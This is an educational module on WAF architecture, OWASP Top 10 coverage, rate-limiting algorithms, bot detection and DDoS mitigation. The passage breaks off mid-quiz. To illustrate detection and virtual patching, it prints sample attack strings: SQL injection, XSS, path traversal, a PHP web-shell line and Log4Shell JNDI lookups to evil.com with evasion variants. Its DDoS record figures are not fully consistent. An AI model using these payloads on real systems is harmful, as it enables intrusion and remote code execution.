---
title: "Module 1.3: WAF & DDoS Mitigation"
slug: platform/foundations/advanced-networking/module-1.3-waf-ddos
sidebar:
  order: 4
---
> **Complexity**: `[MEDIUM]`
>
> **Time to Complete**: 2.5 hours
>
> **Prerequisites**: [Module 1.2: CDN & Edge Computing](../module-1.2-cdn-edge/), basic web security concepts (HTTP methods, SQL, XSS)
>
> **Track**: Foundations — Advanced Networking

---

**September 2017. Equifax, one of the three major US credit bureaus, discloses a breach that exposed the personal data of 147 million Americans — Social Security numbers, birth dates, addresses, and driver's license numbers.**

The root cause? An unpatched Apache Struts vulnerability (CVE-2017-5638) that had a public patch available for two months before the breach. An attacker sent a crafted `Content-Type` header containing an OGNL expression that achieved remote code execution. A single malicious HTTP request, buried in normal traffic, compromised one of the largest repositories of personal data in the United States.

A properly configured Web Application Firewall would have blocked that request on day one. The OGNL injection pattern was well-known. The exploit matched signatures that WAF vendors had deployed within days of the CVE disclosure. **Equifax didn't need to patch faster — they needed a layer of defense that bought them time.**

This is the core promise of WAFs and DDoS mitigation: not perfection, but defense in depth. They don't replace good application security practices, but they catch what slips through — and when the entire internet decides to attack you at once, they're often the only thing standing between your application and total darkness.

---

## Why This Module Matters

Every application exposed to the internet is under constant attack. Not "might be attacked someday" — under attack right now, continuously, from automated scanners, botnets, and targeted adversaries. A typical public-facing web application sees thousands of malicious requests per day: SQL injection probes, cross-site scripting attempts, credential stuffing attacks, and vulnerability scanners looking for unpatched software.

WAFs provide a layer of protection between attackers and your application. They inspect HTTP traffic in real time, matching requests against known attack patterns and behavioral anomalies. When configured correctly, they block attacks that would otherwise exploit vulnerabilities in your code, your frameworks, or your infrastructure.

DDoS mitigation addresses a fundamentally different threat: overwhelming your application with sheer volume. When millions of compromised devices flood your servers with traffic, no amount of application security helps. You need network-level defenses that can absorb and filter traffic at scales that would crush any single server or datacenter.

> **The Bouncer Analogy**
>
> Think of a WAF as the bouncer at a nightclub. The bouncer checks IDs (validates inputs), turns away known troublemakers (blocks malicious signatures), and watches for suspicious behavior (detects anomalies). DDoS protection is more like crowd control outside the venue — when ten thousand people show up at once, you need barriers, police, and a plan that goes beyond what one bouncer can handle.

---

## What You'll Learn

- WAF architecture and inspection methods
- OWASP Top 10 and how WAF rules address each category
- Rate limiting algorithms: token bucket and leaky bucket
- Bot management and the arms race with automation
- DDoS attack taxonomy: volumetric, protocol, and application layer
- Tuning WAFs to minimize false positives
- Hands-on: Deploying a WAF with SQLi blocking and rate limiting

---

## Part 1: Web Application Firewall Architecture

### 1.1 What a WAF Does

```
WAF — REQUEST INSPECTION PIPELINE
═══════════════════════════════════════════════════════════════

A WAF sits between clients and your application, inspecting
every HTTP request before it reaches your servers.

    ┌────────┐         ┌───────────────────┐         ┌────────┐
    │ Client │── req ──→│       WAF         │── req ──→│ Origin │
    │        │         │                   │         │        │
    │        │← resp ──│  1. Parse request │← resp ──│        │
    └────────┘         │  2. Match rules   │         └────────┘
                       │  3. Score threat  │
                       │  4. Allow/Block   │
                       │  5. Log decision  │
                       └───────────────────┘

INSPECTION POINTS
─────────────────────────────────────────────────────────────

    What the WAF examines:

    REQUEST
    ─────────────────────────────────────────────
    ✓ URI path         /admin/../../etc/passwd
    ✓ Query string     ?id=1 OR 1=1--
    ✓ Headers          Content-Type: ${jndi:ldap://evil}
    ✓ Cookies          session=<script>alert(1)</script>
    ✓ Body (POST)      username=admin'--&password=x
    ✓ File uploads     shell.php disguised as image.jpg
    ✓ HTTP method      TRACE, OPTIONS (if unexpected)
    ✓ Protocol         HTTP/1.0 (often used by bots)

    RESPONSE (some WAFs)
    ─────────────────────────────────────────────
    ✓ Status codes     500 errors (information leakage)
    ✓ Headers          Server: Apache/2.4.29
    ✓ Body content     Stack traces, SQL errors, credit cards

DEPLOYMENT MODELS
─────────────────────────────────────────────────────────────

    1. CLOUD WAF (CDN-Integrated)
    ─────────────────────────────────────────────
    Cloudflare, AWS WAF, Akamai Kona, Azure Front Door

    Client → Cloud WAF → CDN → Origin

    ✓ Scales infinitely (CDN infrastructure)
    ✓ DDoS protection included
    ✓ Zero infrastructure to manage
    ✗ Data passes through third party
    ✗ Less customizable rule logic

    2. REVERSE PROXY WAF
    ─────────────────────────────────────────────
    ModSecurity + nginx, OWASP Coraza, HAProxy

    Client → Load Balancer → WAF Proxy → Application

    ✓ Full control over rules and logging
    ✓ Data stays in your infrastructure
    ✗ You manage scaling and availability
    ✗ Single point of failure if not HA

    3. EMBEDDED WAF (In-Application)
    ─────────────────────────────────────────────
    RASP (Runtime Application Self-Protection)

    Client → Application (with embedded WAF agent)

    ✓ Deepest application context
    ✓ Can inspect deserialized objects
    ✗ Performance overhead per request
    ✗ Language/framework specific
```

### 1.2 Rule Types

```
WAF RULE CATEGORIES
═══════════════════════════════════════════════════════════════

SIGNATURE-BASED (Pattern Matching)
─────────────────────────────────────────────────────────────
Match known attack patterns in request data.

    Rule: If request body contains "UNION SELECT"
          AND request path matches "*.php"
          → BLOCK (SQL injection attempt)

    Rule: If header "Content-Type" matches ".*\$\{jndi:.*\}.*"
          → BLOCK (Log4Shell attempt)

    ✓ Low false positive rate for well-known attacks
    ✓ Fast matching (regex, string match)
    ✗ Cannot detect novel/zero-day attacks
    ✗ Evasion via encoding, fragmentation, case changes

ANOMALY SCORING (OWASP CRS Model)
─────────────────────────────────────────────────────────────
Each rule match adds points. Block when score exceeds threshold.

    Request: GET /search?q=<script>alert('xss')</script>&id=1' OR 1=1

    Rule 941100: XSS in query string       → +5 points
    Rule 941160: XSS script tag detected    → +5 points
    Rule 942100: SQL injection in parameter → +5 points
    Rule 942200: SQL boolean injection      → +5 points
    ─────────────────────────────────────────────────
    Total anomaly score: 20

    Paranoia Level 1 threshold: 5   → BLOCK ✓
    Paranoia Level 2 threshold: 5   → BLOCK ✓
    Paranoia Level 3 threshold: 5   → BLOCK ✓
    Paranoia Level 4 threshold: 5   → BLOCK ✓

    ✓ More resilient to evasion (multiple signals)
    ✓ Tunable sensitivity (raise/lower threshold)
    ✗ Harder to debug (which rule triggered?)
    ✗ Legitimate complex requests can score high

BEHAVIORAL / RATE-BASED
─────────────────────────────────────────────────────────────
Track client behavior over time, not individual requests.

    Rule: If client sends >100 requests/minute to /login
          → BLOCK for 10 minutes (brute force)

    Rule: If client hits >50 unique URLs in 30 seconds
          → CHALLENGE (likely scanner)

    Rule: If client error rate >80% over 5 minutes
          → THROTTLE (likely fuzzer/scanner)

POSITIVE SECURITY MODEL (Allowlisting)
─────────────────────────────────────────────────────────────
Define what GOOD traffic looks like. Block everything else.

    /api/users/{id}:
      method: GET
      id: integer, 1-999999
      headers:
        Authorization: Bearer [a-zA-Z0-9._-]+
      → Allow only matching requests

    ✓ Blocks unknown attacks (zero-day protection)
    ✗ Extremely difficult to maintain
    ✗ Breaks when application changes
    ✗ Practical only for simple, stable APIs
```

---

## Part 2: OWASP Top 10 and WAF Coverage

### 2.1 OWASP Top 10 (2021) WAF Mapping

```
OWASP TOP 10 — WAF COVERAGE MATRIX
═══════════════════════════════════════════════════════════════

#   VULNERABILITY              WAF COVERAGE     NOTES
─── ──────────────────────── ────────────────── ─────────────

A01 Broken Access Control      ⚠️  Partial      WAF can block
                                                 path traversal,
                                                 forced browsing.
                                                 Can't enforce
                                                 app-level authz.

A02 Cryptographic Failures     ❌  None         WAF can't fix
                                                 bad encryption.
                                                 Some WAFs detect
                                                 sensitive data in
                                                 responses (PII).

A03 Injection (SQLi, XSS,     ✅  Strong        Core WAF
    Command, LDAP, etc.)                         capability.
                                                 CRS rules cover
                                                 most injection
                                                 patterns.

A04 Insecure Design            ❌  None         Architecture
                                                 problem, not
                                                 detectable at
                                                 request level.

A05 Security Misconfiguration  ⚠️  Partial      Can block
                                                 access to
                                                 admin panels,
                                                 .git directories,
                                                 debug endpoints.

A06 Vulnerable Components      ⚠️  Partial      Virtual patching!
                                                 Block known
                                                 exploit patterns
                                                 before you patch.

A07 Auth & Session Failures    ⚠️  Partial      Rate limit login
                                                 attempts, block
                                                 credential
                                                 stuffing.

A08 Software & Data            ⚠️  Partial      Can inspect
    Integrity Failures                           deserialization
                                                 payloads for
                                                 known gadget
                                                 chains.

A09 Logging & Monitoring       ❌  None         WAF provides its
    Failures                                     own logging, but
                                                 can't fix app
                                                 logging.

A10 Server-Side Request        ⚠️  Partial      Block requests
    Forgery (SSRF)                               containing
                                                 internal IPs
                                                 (169.254.x.x,
                                                 10.x.x.x).

COVERAGE SUMMARY
─────────────────────────────────────────────────────────────
    Strong coverage:    1/10  (Injection)
    Partial coverage:   5/10  (Access, Config, Components,
                               Auth, SSRF)
    No coverage:        4/10  (Crypto, Design, Integrity,
                               Logging)

    Key insight: WAFs are ONE layer of defense, not a
    replacement for secure coding practices.
```

### 2.2 Virtual Patching

```
VIRTUAL PATCHING — BUYING TIME
═══════════════════════════════════════════════════════════════

When a new CVE is published but you can't patch immediately,
a WAF rule can block the exploit pattern.

EXAMPLE: Log4Shell (CVE-2021-44228)
─────────────────────────────────────────────────────────────

    Timeline:
    Dec 9, 2021:   CVE published
    Dec 9, 2021:   WAF vendors deploy rules (hours)
    Dec 10, 2021:  Massive exploitation begins
    Dec 13, 2021:  Log4j 2.16.0 released (4 days later!)
    Jan 2022+:     Many orgs still patching (weeks/months)

    WAF rule (simplified):
    ─────────────────────────────────────────────
    SecRule REQUEST_HEADERS|ARGS|REQUEST_URI \
      "@rx \$\{(?:jndi|lower|upper|env|sys|java|base64):" \
      "id:99001,\
       phase:2,\
       deny,\
       status:403,\
       msg:'Log4Shell CVE-2021-44228 attempt',\
       severity:CRITICAL"

    This rule blocked:
    ${jndi:ldap://evil.com/a}
    ${jndi:rmi://evil.com/a}
    ${${lower:j}${lower:n}di:ldap://evil.com/a}  (evasion)
    ${${env:NaN:-j}ndi:ldap://evil.com/a}        (evasion)

    WAF gave organizations DAYS to weeks of protection
    before they could patch their applications.

VIRTUAL PATCHING PROCESS
─────────────────────────────────────────────────────────────
    1. CVE published → Assess if your app is affected
    2. Create WAF rule to block exploit pattern
    3. Test rule against legitimate traffic (avoid false positives)
    4. Deploy rule (minutes vs days/weeks to patch)
    5. Patch application at normal pace
    6. Keep WAF rule even after patching (defense in depth)
```

---

## Part 3: Rate Limiting

### 3.1 Rate Limiting Algorithms

```
RATE LIMITING ALGORITHMS
═══════════════════════════════════════════════════════════════

FIXED WINDOW
─────────────────────────────────────────────────────────────
Count requests per fixed time window (e.g., per minute).

    Window: 12:00:00 - 12:01:00   Limit: 100 requests

    12:00:00 │▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓│  95 requests  ✓
    12:01:00 │▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓│  88 requests  ✓
    12:02:00 │▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓│ 112 → BLOCKED at 100

    Problem — "Boundary Burst":
    ─────────────────────────────────────────────
    At 12:00:59: 95 requests (just under limit)
    At 12:01:01: 95 more requests (new window, resets)

    190 requests in 2 seconds! Limit was supposed to be 100/min.

SLIDING WINDOW LOG
─────────────────────────────────────────────────────────────
Track timestamp of every request. Count within rolling window.

    Window size: 60 seconds
    Limit: 100 requests

    At 12:01:30, count all requests since 12:00:30.
    No boundary burst problem!

    ✓ Accurate, no boundary issues
    ✗ Memory: must store every request timestamp
    ✗ O(n) counting per check

SLIDING WINDOW COUNTER (Hybrid)
─────────────────────────────────────────────────────────────
Approximate the sliding window using two fixed windows.

    Previous window (12:00-12:01): 84 requests
    Current window  (12:01-12:02): 36 requests so far
    Current position: 12:01:15 (25% into current window)

    Weighted count = 84 × 0.75 + 36 = 99
    (75% of previous window + 100% of current window)

    ✓ Fixed memory (two counters per client)
    ✓ Good approximation, no boundary bursts
    ✓ O(1) per check

TOKEN BUCKET
─────────────────────────────────────────────────────────────
Bucket holds tokens. Each request consumes one token.
Tokens refill at a constant rate.

    Bucket capacity: 10 tokens (burst limit)
    Refill rate:     2 tokens/second (sustained rate)

    ┌──────────────────────────────────────────────────┐
    │  Bucket: [●●●●●●●●●●]  10/10 tokens  (full)    │
    │                                                  │
    │  Burst of 10 requests:                           │
    │  Bucket: [          ]  0/10 tokens               │
    │  Next request: BLOCKED (no tokens)               │
    │                                                  │
    │  1 second later:                                 │
    │  Bucket: [●●        ]  2/10 tokens (refilled)   │
    │  2 requests allowed, then blocked again          │
    │                                                  │
    │  5 seconds of no traffic:                        │
    │  Bucket: [●●●●●●●●●●]  10/10 (capped at max)   │
    └──────────────────────────────────────────────────┘

    ✓ Allows controlled bursts
    ✓ Smooth rate over time
    ✓ Easy to implement with two values: tokens, last_refill
    ✓ Used by most APIs (Stripe, GitHub, AWS)

LEAKY BUCKET
─────────────────────────────────────────────────────────────
Requests enter a queue. Queue drains at fixed rate.
If queue is full, new requests are dropped.

    Queue capacity: 10
    Drain rate: 2 requests/second

    ┌──────────────────────────────────────────────────┐
    │  Input: 20 requests arrive simultaneously        │
    │                                                  │
    │  Queue: [1][2][3][4][5][6][7][8][9][10]         │
    │  Dropped: 10 requests (queue full)               │
    │                                                  │
    │  Processing: 2 requests/second leave queue       │
    │  t=0s: Process 1,2                               │
    │  t=1s: Process 3,4                               │
    │  t=2s: Process 5,6                               │
    │  ...                                             │
    │  t=4s: Process 9,10 → queue empty                │
    └──────────────────────────────────────────────────┘

    ✓ Perfectly smooth output rate
    ✓ No bursts reach backend
    ✗ Adds latency (queuing)
    ✗ Less friendly than token bucket for API consumers

COMPARISON
─────────────────────────────────────────────────────────────
    Algorithm        Burst?    Memory     Precision   Use Case
    ────────────── ──────── ─────────── ──────────── ──────────
    Fixed Window     Yes*      Low        Low         Simple
    Sliding Log      No        High       Perfect     Strict
    Sliding Counter  Minimal   Low        Good        Production
    Token Bucket     Yes       Low        Good        APIs
    Leaky Bucket     No        Low        Good        Queue-based

    * Fixed window allows 2x burst at window boundaries
```

### 3.2 Rate Limiting Keys and Strategies

```
RATE LIMITING — WHAT TO LIMIT BY
═══════════════════════════════════════════════════════════════

BY SOURCE IP
─────────────────────────────────────────────────────────────
    100 requests/minute per IP address.

    ⚠️  Problem: NAT. A corporate office with 10,000 users
        behind a single IP gets rate-limited as one client.

    ⚠️  Problem: VPNs. Legitimate users sharing VPN exit IPs
        collectively exhaust the limit.

    Mitigation: Higher limits + IP reputation scoring.

BY API KEY / TOKEN
─────────────────────────────────────────────────────────────
    1000 requests/minute per API key.

    ✓ More granular than IP
    ✓ Ties to a specific customer/application
    ✗ Doesn't help for unauthenticated endpoints (login page)

BY USER SESSION
─────────────────────────────────────────────────────────────
    20 requests/minute per session to /login

    ✓ Prevents brute force per-account
    ✗ Attacker can create new sessions

BY ENDPOINT
─────────────────────────────────────────────────────────────
    Different limits for different endpoints:

    /api/search:     50 req/min  (expensive query)
    /api/users:      200 req/min (lightweight)
    /login:          5 req/min   (brute force protection)
    /api/export:     2 req/hour  (very expensive)

COMPOUND KEYS
─────────────────────────────────────────────────────────────
    Combine dimensions for fine-grained control:

    Key: IP + Endpoint + Method
    Limit: 10 POST requests to /login per IP per minute

    This allows:
    - 10 login attempts from Office IP 1
    - 10 login attempts from Office IP 2
    - Unlimited GET requests to /login (show the form)
    - Unlimited POST requests to /api/data (different endpoint)

RATE LIMIT RESPONSE HEADERS (IETF RFC 6585 / Draft)
─────────────────────────────────────────────────────────────
    HTTP/1.1 429 Too Many Requests
    Retry-After: 30
    X-RateLimit-Limit: 100
    X-RateLimit-Remaining: 0
    X-RateLimit-Reset: 1704067260

    Proper 429 responses let clients implement backoff.
    Include Retry-After to tell them when to try again.
```

---

## Part 4: Bot Management

### 4.1 The Bot Spectrum

```
BOT TRAFFIC — NOT ALL BOTS ARE BAD
═══════════════════════════════════════════════════════════════

~40-50% of web traffic is automated (bots).

GOOD BOTS
─────────────────────────────────────────────────────────────
    Googlebot / Bingbot      Search engine crawlers
    GPTBot / Anthropic-AI    AI training crawlers
    Monitoring bots          Uptime/performance checks
    Feed readers             RSS/Atom fetchers

    Identification: User-Agent + IP range verification

    # Verify Googlebot
    host 66.249.66.1
    → crawl-66-249-66-1.googlebot.com

BAD BOTS
─────────────────────────────────────────────────────────────
    Credential stuffing      Try stolen username/password lists
    Content scraping         Steal product data, pricing
    Inventory hoarding       Hold items in carts, deny to real users
    Ad fraud                 Click on ads from fake browsers
    Vulnerability scanning   Probe for CVEs and misconfigs
    Spam bots                Submit forms, create fake accounts

BOT SOPHISTICATION LEVELS
─────────────────────────────────────────────────────────────

    Level 1: Simple Scripts
    ─────────────────────────────────────────────
    curl/wget/Python requests. Fixed User-Agent.
    Detection: User-Agent string, no JavaScript execution.

    Level 2: Headless Browsers
    ─────────────────────────────────────────────
    Puppeteer, Playwright, Selenium. Execute JavaScript.
    Detection: Browser fingerprinting (navigator, WebGL,
    canvas), JavaScript challenges.

    Level 3: Stealth Browsers
    ─────────────────────────────────────────────
    puppeteer-extra-stealth, undetected-chromedriver.
    Spoof all browser properties. Rotate User-Agents.
    Detection: Behavioral analysis (mouse movements,
    typing patterns, timing).

    Level 4: Human-Aided / CAPTCHA Farms
    ─────────────────────────────────────────────
    Real humans solving CAPTCHAs for $1/1000 solves.
    AI solving CAPTCHAs with >90% accuracy.
    Detection: Extremely difficult. Behavioral biometrics,
    device fingerprinting, threat intelligence.

DETECTION TECHNIQUES
─────────────────────────────────────────────────────────────

    Passive (no user impact):
    ├── TLS fingerprinting (JA3/JA4)
    │   Browser TLS handshakes have unique signatures.
    │   Chrome's JA3 ≠ Python requests' JA3
    │
    ├── HTTP/2 fingerprinting
    │   SETTINGS frame, WINDOW_UPDATE, priority
    │   Each browser has unique HTTP/2 behavior
    │
    ├── IP reputation
    │   Known bot IPs, datacenter IPs, proxy IPs
    │   Residential IPs are harder to block
    │
    └── Request pattern analysis
        Timing regularity, request sequence, header order

    Active (may impact UX):
    ├── JavaScript challenge
    │   Require JS execution to get a cookie/token
    │   Blocks curl/wget, not headless browsers
    │
    ├── CAPTCHA / Managed Challenge
    │   Image recognition, puzzle solving
    │   Blocks most bots, annoys users
    │
    └── Proof of Work
        Require client to solve computational puzzle
        (Cloudflare Turnstile's approach)
```

---

## Part 5: DDoS Attack Taxonomy and Mitigation

### 5.1 DDoS Attack Types

```
DDoS ATTACK TAXONOMY
═══════════════════════════════════════════════════════════════

LAYER 3/4: VOLUMETRIC ATTACKS
─────────────────────────────────────────────────────────────
Goal: Overwhelm network bandwidth and infrastructure.

    UDP Flood
    ─────────────────────────────────────────────
    Send massive UDP packets to random ports.
    Victim's server checks for listening app → ICMP unreachable.
    Volume: Up to 3.47 Tbps (2025 record).

    SYN Flood
    ─────────────────────────────────────────────
    Send millions of TCP SYN packets with spoofed source IPs.
    Server allocates resources for half-open connections.
    Connection table fills → legitimate connections rejected.

    Mitigation: SYN cookies (stateless SYN handling).

    DNS Amplification
    ─────────────────────────────────────────────
    Send DNS queries with victim's spoofed IP to open resolvers.
    DNS response is 50-70x larger than the query.
    Amplification: 60-byte query → 4000-byte response.

    Attacker → Open Resolver: "What are ALL records for example.com?"
                               (spoofed source: victim IP)
    Open Resolver → Victim: [massive response]

    NTP Amplification: similar, up to 556x amplification.

    Carpet Bombing
    ─────────────────────────────────────────────
    Instead of targeting one IP, spread attack across entire
    /24 subnet. Each IP gets traffic below detection threshold.
    But aggregate traffic saturates upstream links.

LAYER 7: APPLICATION ATTACKS
─────────────────────────────────────────────────────────────
Goal: Exhaust application resources (CPU, memory, DB).

    HTTP Flood
    ─────────────────────────────────────────────
    Send legitimate-looking HTTP requests at massive scale.
    Each request is valid — hard to distinguish from real users.

    GET /search?q=very+expensive+query
    GET /api/export?format=pdf&all=true
    POST /login (with random credentials)

    Slowloris
    ─────────────────────────────────────────────
    Open many connections, send headers very slowly.
    Send one byte every 10 seconds. Never complete request.
    Server keeps connection open, waiting for rest of headers.
    Connection pool exhausted → no new connections accepted.

    # Conceptual Slowloris: keep sending partial headers
    GET / HTTP/1.1\r\n
    Host: target.com\r\n
    X-Header-1: value\r\n         ← sent at t=0
    ... wait 9 seconds ...
    X-Header-2: value\r\n         ← sent at t=9
    ... wait 9 seconds ...
    X-Header-3: value\r\n         ← sent at t=18
    ... never send final \r\n ...

    Mitigation: Request timeout, max header size, connection limits.

    R-U-Dead-Yet (RUDY)
    ─────────────────────────────────────────────
    Similar to Slowloris but for POST bodies.
    Send Content-Length: 1000000 then trickle 1 byte at a time.

LAYER 7: CHALLENGE-COLLAPSAR (CC) ATTACKS
─────────────────────────────────────────────────────────────
    Target computationally expensive endpoints.

    /search?q=a%20OR%20b%20OR%20c%20OR%20d...  (complex DB query)
    /api/report?start=2020-01-01&end=2025-12-31 (huge dataset)
    /resize?url=huge-image.png&w=1&h=1         (CPU-intensive)

    Small request → Massive backend computation.
    100 req/s can bring down a powerful server.
```

### 5.2 DDoS Mitigation Architecture

```
DDoS MITIGATION — LAYERED DEFENSE
═══════════════════════════════════════════════════════════════

LAYER 1: ANYCAST NETWORK (Absorb)
─────────────────────────────────────────────────────────────

    Attack traffic: 500 Gbps

    Without Anycast:
    ┌─────────────────────────────────────────────────────┐
    │  Single datacenter   │ 500 Gbps → 10 Gbps capacity │
    │  OVERWHELMED ✗       │ 490 Gbps exceeds capacity    │
    └─────────────────────────────────────────────────────┘

    With Anycast (330 PoPs):
    ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐
    │ PoP #1   │ │ PoP #2   │ │ PoP #3   │ │  ...330  │
    │ ~1.5 Gbps│ │ ~1.5 Gbps│ │ ~1.5 Gbps│ │ ~1.5 Gbps│
    │ 100 Gbps │ │ 100 Gbps │ │ 100 Gbps │ │ 100 Gbps │
    │ capacity │ │ capacity │ │ capacity │ │ capacity │
    │ ✓ OK     │ │ ✓ OK     │ │ ✓ OK     │ │ ✓ OK     │
    └──────────┘ └──────────┘ └──────────┘ └──────────┘

    500 Gbps distributed across 330 PoPs = ~1.5 Gbps each.
    Each PoP has 100+ Gbps capacity. Attack absorbed.

LAYER 2: TRAFFIC SCRUBBING (Filter)
─────────────────────────────────────────────────────────────

    ┌──────────────────────────────────────────────────────┐
    │  Scrubbing Center                                    │
    │                                                      │
    │  1. Network ACLs                                     │
    │     Drop traffic from known-bad IP ranges            │
    │     Drop invalid protocol combinations               │
    │                                                      │
    │  2. SYN Proxy / SYN Cookies                         │
    │     Complete TCP handshake on behalf of origin        │
    │     Only forward fully established connections        │
    │                                                      │
    │  3. Rate Limiting (per-source)                       │
    │     Cap packets/second from individual sources        │
    │                                                      │
    │  4. Challenge-Response                               │
    │     JavaScript challenge for HTTP requests            │
    │     Proof of Work for suspicious patterns             │
    │                                                      │
    │  5. Machine Learning Classification                  │
    │     Behavioral analysis of traffic patterns           │
    │     Distinguish legitimate traffic from attack        │
    └──────────────────────────────────────────────────────┘

LAYER 3: APPLICATION-LEVEL PROTECTION
─────────────────────────────────────────────────────────────
    WAF rules for L7 attack patterns
    Rate limiting per endpoint
    CAPTCHA/challenge for suspicious behavior
    Auto-scaling to absorb remaining load
    Circuit breakers to protect downstream services

MITIGATION TIMELINE
─────────────────────────────────────────────────────────────
    t=0:        Attack begins
    t=0-10s:    Anycast distributes across PoPs
    t=10-30s:   Automatic detection (traffic anomaly)
    t=30-60s:   Scrubbing rules activated
    t=1-5min:   ML models classify and filter
    t=5min+:    Stable mitigation, attack absorbed

    Always-on vs On-demand:
    ─────────────────────────────────────────────
    Always-on (Cloudflare, Fastly):
      Traffic ALWAYS flows through scrubbing.
      Mitigation starts at t=0. No delay.

    On-demand (AWS Shield Advanced):
      Traffic flows directly to origin normally.
      During attack, BGP reroutes to scrubbing.
      30-60 second delay during reroute.
```

---

## Part 6: WAF Tuning — Reducing False Positives

### 6.1 The False Positive Problem

```
FALSE POSITIVES — THE WAF TUNING CHALLENGE
═══════════════════════════════════════════════════════════════

A false positive blocks a legitimate request.

COMMON FALSE POSITIVE SCENARIOS
─────────────────────────────────────────────────────────────

    1. Blog comments containing SQL keywords
       User writes: "I want to SELECT the best UNION of teams"
       WAF sees: SELECT ... UNION → SQL injection! BLOCKED.

    2. Code-sharing platforms
       User pastes: <?php system($_GET['cmd']); ?>
       WAF sees: PHP code execution → Command injection! BLOCKED.

    3. Complex search queries
       User searches: price < 100 AND color = "red" OR size > "L"
       WAF sees: AND ... OR → SQL boolean injection! BLOCKED.

    4. File uploads with embedded metadata
       Image EXIF contains: "Canon EOS SELECT * FROM cameras"
       WAF sees: SELECT * FROM → SQL injection! BLOCKED.

    5. API payloads with special characters
       JSON body: {"formula": "=SUM(A1:B2)"}
       WAF sees: = at start → CSV injection! BLOCKED.

TUNING PROCESS
─────────────────────────────────────────────────────────────

    Phase 1: DETECTION MODE (2-4 weeks)
    ─────────────────────────────────────────────
    Deploy WAF in log-only mode. Don't block anything.
    Collect all rule matches against real production traffic.

    Action: LOG  (not BLOCK)

    Phase 2: ANALYZE FALSE POSITIVES
    ─────────────────────────────────────────────
    Review logged matches. Categorize:

    True Positive:  Real attack → Keep rule as-is
    False Positive: Legitimate request → Create exception
    Uncertain:      Needs investigation → Keep logging

    Phase 3: CREATE EXCEPTIONS
    ─────────────────────────────────────────────
    Exceptions should be as narrow as possible:

    BAD (too broad):
      Disable rule 942100 entirely  ← ALL SQLi detection off!

    BETTER (scoped):
      Disable rule 942100 for path /blog/comments
      when ARGS:comment triggers the match

    BEST (surgical):
      Disable rule 942100 for path /blog/comments
      when ARGS:comment triggers the match
      AND source IP is not in high-risk countries

    Phase 4: ENABLE BLOCKING
    ─────────────────────────────────────────────
    Switch from LOG to BLOCK mode.
    Monitor error rates and customer complaints.
    Keep a fast path to add new exceptions.

    Phase 5: ONGOING MAINTENANCE
    ─────────────────────────────────────────────
    New application features → new false positives.
    WAF rule updates → new false positives.
    Review WAF logs weekly. Tune continuously.

PARANOIA LEVELS (OWASP CRS)
─────────────────────────────────────────────────────────────
    PL1: Standard detection. Few false positives.
         Good starting point for most applications.

    PL2: More patterns. Some false positives likely.
         Good for applications with moderate security needs.

    PL3: Aggressive detection. Expect false positives.
         Needs tuning. For high-security applications.

    PL4: Maximum detection. Many false positives.
         Requires significant tuning. For critical applications.

    START AT PL1. Tune. Move to PL2. Tune again.
    Most applications never need PL3 or PL4.
```

---

## Did You Know?

- **The largest DDoS attack ever recorded hit 5.6 Tbps in late 2024**, targeting an ISP in Eastern Asia. It was a UDP flood from a Mirai-variant botnet comprising over 13,000 compromised devices. Cloudflare mitigated it automatically in under 15 seconds. To put that bandwidth in perspective, it is enough to transfer the entire Library of Congress digitized collection every two seconds.

- **The OWASP Core Rule Set (CRS) has been protecting websites since 2006** and is the default ruleset for ModSecurity, the most widely deployed WAF engine. CRS version 4.x contains over 200 rules covering injection, XSS, path traversal, and more. It is community-maintained and completely free, used by organizations from small businesses to Fortune 500 companies.

- **Credential stuffing attacks use passwords from old breaches to access new services.** Because 65% of people reuse passwords, an attacker with the LinkedIn 2012 breach data (117 million credentials) can successfully log into ~1-3% of accounts on unrelated services. A single credential stuffing campaign might try millions of username/password pairs at a rate of thousands per second.

---

## Common Mistakes

| Mistake | Problem | Solution |
|---------|---------|----------|
| Deploying WAF in block mode day one | Blocks legitimate users immediately | Start in detection/log mode for 2-4 weeks |
| Disabling entire rules for false positives | Removes protection for all requests | Create narrow, path-specific exceptions |
| Rate limiting by IP only | Punishes users behind shared NAT | Combine IP + session + fingerprint keys |
| No rate limit on login endpoint | Credential stuffing and brute force succeed | 5-10 attempts/minute per IP + account lockout |
| Blocking all bots | Breaks SEO (Googlebot) and monitoring | Allowlist verified good bots by IP verification |
| Ignoring WAF logs | Miss attack patterns and false positives | Review WAF logs weekly, automate alerts for blocks |
| WAF without origin protection | Attacker bypasses WAF by hitting origin IP directly | Use origin pull certificates (mTLS) or IP allowlisting |
| Same rate limit for all endpoints | Expensive endpoints vulnerable, simple ones too restricted | Set per-endpoint limits based on cost and risk |
| Relying solely on WAF for security | WAF covers ~30% of OWASP Top 10 | WAF is one layer — still need secure coding, patching, auth |

---

## Quiz

1. **Explain the difference between signature-based detection and anomaly scoring. When would you prefer each?**
   <details>
   <summary>Answer</summary>

   **Signature-based detection** matches specific patterns in request data. A rule says "if the request contains `UNION SELECT`, block it." It is binary — either the pattern matches or it doesn't.

   **Anomaly scoring** assigns points for each suspicious pattern found. Multiple low-confidence matches can accumulate to exceed a blocking threshold. A request containing `SELECT` alone might score 2 points (not blocked), but `SELECT` + `UNION` + `--` might score 15 points (blocked at threshold 10).

   When to prefer each:
   - **Signature-based**: For blocking specific, known exploits (CVE virtual patches, Log4Shell). Low false positive rate for well-defined patterns. Use when you know exactly what to block.
   - **Anomaly scoring**: For general protection against unknown variations. More resilient to evasion (attackers must avoid triggering multiple rules simultaneously). Use for broad application protection where attack patterns vary.

   Most production WAFs use both: anomaly scoring for general protection plus signature rules for specific high-confidence threats.
   </details>

2. **Compare token bucket and leaky bucket rate limiting. Design a rate limiting scheme for a public API that serves both free and paid users.**
   <details>
   <summary>Answer</summary>

   **Token bucket**: Allows bursts up to bucket capacity, then enforces sustained rate. A bucket with 10 tokens and 2 tokens/second refill allows 10 rapid requests followed by 2/second steady state. User-friendly because it accommodates short bursts of activity.

   **Leaky bucket**: Enqueues requests and processes them at a fixed rate. No bursts reach the backend. Smoother for backend servers but adds latency for clients during bursts.

   **Public API rate limiting design**:

   Free tier (token bucket):
   - Bucket capacity: 10 (burst allowance)
   - Refill rate: 1 request/second (60/minute sustained)
   - Key: API key
   - Response headers: `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `Retry-After`
   - On exceed: HTTP 429 with `Retry-After` header

   Paid tier (token bucket):
   - Bucket capacity: 50 (larger burst)
